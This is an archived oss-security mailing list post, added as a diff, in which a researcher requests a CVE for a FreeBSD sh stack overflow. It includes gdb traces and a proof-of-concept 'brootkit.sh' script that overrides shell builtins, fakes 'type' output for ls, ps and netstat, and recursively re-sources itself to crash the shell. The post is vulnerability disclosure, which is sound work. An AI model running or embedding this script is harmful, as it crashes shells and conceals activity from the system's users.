@@ -1,0 +1,321 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE request: freebsd/sh stack overflow vulnerability</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="3">[&lt;prev]</a> <a href="5">[next&gt;]</a> <a href="../../../2015/04/13/7">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw&#64;mail.gmail.com&gt;
+Date: Tue, 31 Mar 2015 18:42:01 +0800
+From: wzt wzt &lt;wzt.wzt&#64;...il.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: CVE request: freebsd/sh stack overflow vulnerability
+
+hi：
+    I found sh have a stack overflow bug on freebsd(9.0-10.0),  it may be
+triggered on all freebsd systems, but i have not tested yet. the poc below
+is tested on freebsd10.0 amd64 arch:
+
+$ ls
+brootkit.sh
+$ . brootkit.sh
+$ command
+$ ls
+brootkit.sh     sh.core
+
+(gdb) x/16x $rsp+0x1b8
+0x7fffdfffeff8: Cannot access memory at address 0x7fffdfffeff8
+(gdb) x/16x $rsp+0x1c0
+0x7fffdffff000: 0x0000000000000000      0x0000000000000000
+0x7fffdffff010: 0x0000000000000000      0x0000000000000000
+0x7fffdffff020: 0x0000000000000000      0x0000000000000000
+0x7fffdffff030: 0x0000000000000000      0x0000000000000000
+0x7fffdffff040: 0x0000000000000000      0x0000000000000000
+0x7fffdffff050: 0x0000000000000000      0x0000000000000000
+0x7fffdffff060: 0x0000000000000000      0x0000000000000000
+0x7fffdffff070: 0x0000000000000000      0x0000000000000000
+
+(gdb) disass malloc malloc+32
+Dump of assembler code from 0x800d593f0 to 0x800d59410:
+0x0000000800d593f0 &lt;malloc+0&gt;:  push   %rbp
+0x0000000800d593f1 &lt;malloc+1&gt;:  mov    %rsp,%rbp
+0x0000000800d593f4 &lt;malloc+4&gt;:  push   %r15
+0x0000000800d593f6 &lt;malloc+6&gt;:  push   %r14
+0x0000000800d593f8 &lt;malloc+8&gt;:  push   %r13
+0x0000000800d593fa &lt;malloc+10&gt;: push   %r12
+0x0000000800d593fc &lt;malloc+12&gt;: push   %rbx
+0x0000000800d593fd &lt;malloc+13&gt;: sub    $0x488,%rsp
+0x0000000800d59404 &lt;malloc+20&gt;: mov    %rdi,-0x4a0(%rbp)
+0x0000000800d5940b &lt;malloc+27&gt;: mov    0x2c2dbe(%rip),%rax        #
+0x80101c1d0 &lt;__nsdefaultsrc+4928&gt;
+
+
+set $i=0
+set $addr=$rbp
+while ($i &lt;= 1000)
+printf "frame[%d] 0x%lx ==&gt; 0x%lx retaddr: 0x%lx\t diass: ", $i, $addr,
+*(long *)$addr, *(long *)($addr+8)
+x/i  *(long *)($addr+8)
+set $i=$i+1
+set $addr=*(long *)$addr
+end
+
+frame[98] 0x7fffe0004c00 ==&gt; 0x7fffe0004d60 retaddr: 0x406465    diass:
+0x406465 &lt;execve&#64;...+14073&gt;:    incq   0x21d694(%rip)        # 0x623b00
+&lt;environ+64&gt;
+frame[99] 0x7fffe0004d60 ==&gt; 0x7fffe0004e10 retaddr: 0x40513b    diass:
+0x40513b &lt;execve&#64;...+9167&gt;:     mov    -0x74(%rbp),%r14d
+frame[100] 0x7fffe0004e10 ==&gt; 0x7fffe0004ec0 retaddr: 0x405118   diass:
+0x405118 &lt;execve&#64;...+9132&gt;:     cmpl   $0x0,0x21e9f5(%rip)        #
+0x623b14 &lt;environ+84&gt;
+
+poc:
+
+#!/bin/sh
+
+BR_ROOTKIT_PATH="."
+
+builtin()
+{
+        local fake_a
+
+        unset command
+        case $1 in
+                "set"|"unset"|"command"|"type")
+                        fake_a="$(command builtin $1 $2)"
+                        br_hide_engine "$fake_a"
+                        reset_command
+                        return ;;
+                "builtin")
+                        echo "sh: builtin: builtin: syntax error, sh is not
+support."
+                        reset_command
+                        return ;;
+                *)
+                        command builtin $1 $2
+                        reset_command
+                        ;;
+        esac
+}
+
+type()
+{
+        case $1 in
+                "builtin"|"set"|"unset"|"type")
+                        echo "$1 is a shell builtin"
+                        return ;;
+                "dir")
+                        echo "dir is /usr/bin/dir"
+                        return ;;
+                "ls")
+                        echo "ls is aliased to ls --color=tty"
+                        return ;;
+                "ps")
+                        echo "ps is /bin/ps"
+                        return ;;
+                "netstat")
+                        echo "netstat is hashed (/usr/bin/netstat)"
+                        return ;;
+                "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")
+                        echo "$1 is $1"
+                        return ;;
+                *)
+                        unset command
+                        command type $1 $2
+                        reset_command
+                        return ;;
+        esac
+}
+
+fake_unset()
+{
+        case $1 in
+                "builtin"|"command"|"set"|"unset"|"type")
+                        echo "sh: syntax error, sh is not support."
+                        return ;;
+                *)
+                        unset $1 $2
+                        return ;;
+        esac
+}
+
+fake_command()
+{
+        case $1 in
+                "builtin"|"command"|"set"|"unset"|"type")
+                        echo "sh: syntax error, sh is not support."
+                        return ;;
+                *)
+                        unset command
+                        command $1 $2
+                        reset_command
+                        return ;;
+        esac
+}
+
+command()
+{
+        case $1 in
+                "builtin")
+                        builtin $2 $3
+                        return ;;
+                "unset")
+                        fake_unset $2 $3
+                        . $BR_ROOTKIT_PATH/brootkit.sh
+                        return ;;
+                "type")
+                        type $2 $3
+                        return ;;
+                "command")
+                        fake_command $2 $3
+                        return ;;
+                *)
+                        unset command
+                        command $2 $3
+                        . $BR_ROOTKIT_PATH/brootkit.sh
+                        return ;;
+        esac
+}
+
+reset_command()
+{
+        command()
+        {
+                case $1 in
+                        "builtin")
+                                builtin $2 $3
+                                return ;;
+                        "set")
+                                set $2 $3
+                                return ;;
+                        "unset")
+                                fake_unset $2 $3
+                                . $BR_ROOTKIT_PATH/brootkit.sh
+                                return ;;
+                        "type")
+                                type $2 $3
+                                return ;;
+                        "command")
+                                fake_command $2 $3
+                                return ;;
+                        *)
+                                unset command
+                                command $2 $3
+                                . $BR_ROOTKIT_PATH/brootkit.sh
+                                return ;;
+                esac
+        }
+}
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
